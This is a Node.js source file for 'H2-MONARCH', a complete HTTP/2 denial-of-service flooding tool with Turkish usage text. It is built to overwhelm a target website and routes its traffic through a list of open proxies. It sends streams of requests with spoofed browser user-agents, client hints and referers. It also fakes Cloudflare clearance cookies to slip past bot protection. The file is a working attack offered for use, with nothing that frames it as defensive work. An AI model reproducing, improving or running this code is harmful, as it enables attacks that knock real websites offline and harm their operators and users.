"use strict";

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const crypto = require("crypto");

// Performans ve Hata Yönetimi
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

if (process.argv.length < 7) {
    console.log(`
    [!] H2-MONARCH - Method developed by Genisys
    Kullanım: node H2-MONARCH.js [HEDEF] [SÜRE] [HIZ] [THREAD] [PROXY_DOSYASI]
    Örnek: node H2-MONARCH.js https://example.com 120 64 8 proxy.txt
    `);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(Boolean);
const parsedTarget = url.parse(args.target);

const paths = ["/", "/login", "/register", "/api/v1/user", "/contact", "/products", "/shop", "/search?q=" + crypto.randomBytes(3).toString("hex")];

// --- GENİŞLETİLMİŞ BROWSER HAVUZU ---
const browserPool = [
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="99"' },
    { ua: "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Chromium";v="132", "Google Chrome";v="132"' },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "macOS", mobile: "?0", ch: '"Chromium";v="133", "Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "Linux", mobile: "?0", ch: '"Chromium";v="133", "Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Chromium";v="131", "Google Chrome";v="131"' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", platform: "Windows", mobile: "?0", ch: "Firefox" },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.2; rv:135.0) Gecko/20100101 Firefox/135.0", platform: "macOS", mobile: "?0", ch: "Firefox" },
    { ua: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0", platform: "Linux", mobile: "?0", ch: "Firefox" },
    { ua: "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0", platform: "Windows", mobile: "?0", ch: "Firefox" },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0", platform: "Windows", mobile: "?0", ch: '"Chromium";v="133", "Microsoft Edge";v="133"' },
    { ua: "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0", platform: "Windows", mobile: "?0", ch: '"Chromium";v="132", "Microsoft Edge";v="132"' },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0", platform: "macOS", mobile: "?0", ch: '"Chromium";v="133", "Microsoft Edge";v="133"' },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15", platform: "macOS", mobile: "?0", ch: '"Safari";v="18"' },
    { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1", platform: "iOS", mobile: "?1", ch: '"Safari";v="19"' },
    { ua: "Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1", platform: "iOS", mobile: "?1", ch: '"Safari";v="18"' },
    { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1", platform: "iOS", mobile: "?1", ch: '"Safari";v="18"' },
    { ua: "Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.54 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"Google Chrome";v="132"' },
    { ua: "Mozilla/5.0 (Linux; Android 15; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"Chromium";v="133"' },
    { ua: "Mozilla/5.0 (Linux; Android 14; Samsung SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/131.0.0.0 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"SamsungBrowser";v="27"' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/25.2.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Yandex";v="25"' },
    { ua: "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0", platform: "Windows", mobile: "?0", ch: '"Opera";v="116"' },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 OPR/115.0.0.0", platform: "macOS", mobile: "?0", ch: '"Opera";v="115"' },
    { ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Vivaldi/7.1.3", platform: "Linux", mobile: "?0", ch: '"Vivaldi";v="7"' },
    { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Mobile/15E148 Safari/604.1", platform: "iOS", mobile: "?1", ch: '"Safari";v="17"' },
    { ua: "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (Linux; Android 15; Sony XQ-DQ54) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"Chromium";v="133"' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (Macintosh; Apple Message; 15.2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15", platform: "macOS", mobile: "?0", ch: '"Safari";v="18"' },
    { ua: "Mozilla/5.0 (X11; CrOS x86_64 15117.112.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "ChromeOS", mobile: "?0", ch: '"Chromium";v="133"' }
];

const cipherList = ["TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-GCM-SHA384"];

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array.join(":");
}

if (cluster.isMaster) {
    console.log(`[!] H2-MONARCH Attack Started on ${args.target}`);
    console.log(`[!] Threads: ${args.threads} | Rate: ${args.rate} | Time: ${args.time}s`);
    
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => {
        console.log("[!] Attack Finished.");
        process.exit(0);
    }, args.time * 1000);
} else {
    setInterval(runFlooder, 1);
}

function runFlooder() {
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyAddr) return;

    const [proxyHost, proxyPort] = proxyAddr.split(":");
    const connection = net.connect(parseInt(proxyPort), proxyHost);

    connection.once("connect", () => {
        connection.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
    });

    connection.once("data", (chunk) => {
        if (!chunk.toString().includes("HTTP/1.1 200")) { connection.destroy(); return; }

        const tlsConn = tls.connect({
            socket: connection,
            servername: parsedTarget.hostname,
            ALPNProtocols: ["h2"],
            ciphers: shuffle([...cipherList]),
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2'
        });

        tlsConn.once("secureConnect", () => {
            const client = http2.connect(args.target, {
                createConnection: () => tlsConn,
                settings: { 
                    initialWindowSize: 6291456 + Math.floor(Math.random() * 4096),
                    maxFrameSize: 16384,
                    enablePush: false
                }
            });

            client.on("connect", () => {
                const attackInterval = setInterval(() => {
                    for (let i = 0; i < args.rate; i++) {
                        const browser = browserPool[Math.floor(Math.random() * browserPool.length)];
                        const randomPath = paths[Math.floor(Math.random() * paths.length)];
                        const isPost = Math.random() > 0.8;

                        // --- AKILLI REFERER MANTIĞI ---
                        const genericReferers = [
                            args.target, 
                            args.target + paths[Math.floor(Math.random() * paths.length)],
                            "https://www.google.com/",
                            "https://duckduckgo.com/",
                            "https://t.co/", 
                            "https://www.reddit.com/"
                        ];

                        let selectedReferer = genericReferers[Math.floor(Math.random() * genericReferers.length)];

                        if (browser.ua.includes("YaBrowser")) {
                            selectedReferer = "https://yandex.com.tr/";
                        } else if (browser.ua.includes("Edg/")) {
                            selectedReferer = "https://www.bing.com/";
                        } else if (browser.platform === "iOS" || browser.platform === "Android") {
                            selectedReferer = ["https://m.facebook.com/", "https://www.instagram.com/", "https://t.co/"].sort(() => 0.5 - Math.random())[0];
                        }

                        // --- HEADER YAPILANDIRMASI ---
                        const headers = {
                            ":method": isPost ? "POST" : "GET",
                            ":authority": parsedTarget.host,
                            ":scheme": "https",
                            ":path": randomPath,
                            "user-agent": browser.ua,
                            "referer": selectedReferer,
                            "sec-ch-ua": browser.ch,
                            "sec-ch-ua-mobile": browser.mobile,
                            "sec-ch-ua-platform": `"${browser.platform}"`,
                            "accept": "text/html,application/xhtml+xml,*/*;q=0.9",
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                            "cache-control": "max-age=0",
                            "sec-fetch-dest": "document",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-site": selectedReferer.includes(parsedTarget.host) ? "same-origin" : "cross-origin",
                            "sec-fetch-user": "?1",
                            "upgrade-insecure-requests": "1",
                            "cookie": `_cfuvid=${crypto.randomBytes(12).toString("hex")}; cf_clearance=${crypto.randomBytes(22).toString("hex")}; session_id=${crypto.randomBytes(16).toString("hex")}`,
                            "x-requested-with": "XMLHttpRequest"
                        };

                        const req = client.request(headers);
                        
                        if (isPost) {
                            req.write(JSON.stringify({ 
                                timestamp: Date.now(),
                                token: crypto.randomBytes(16).toString("hex"),
                                action: "track" 
                            }));
                        }

                        req.on("response", () => { 
                            req.close(); 
                            req.destroy(); 
                        });
                        
                        req.end();
                    }
                }, 1000);

                setTimeout(() => { 
                    clearInterval(attackInterval); 
                    client.close(); 
                    connection.destroy(); 
                }, 10000);
            });

            client.on("error", () => { 
                client.destroy(); 
                connection.destroy(); 
            });
        });
    });

    connection.on("error", () => { 
        connection.destroy(); 
    });
}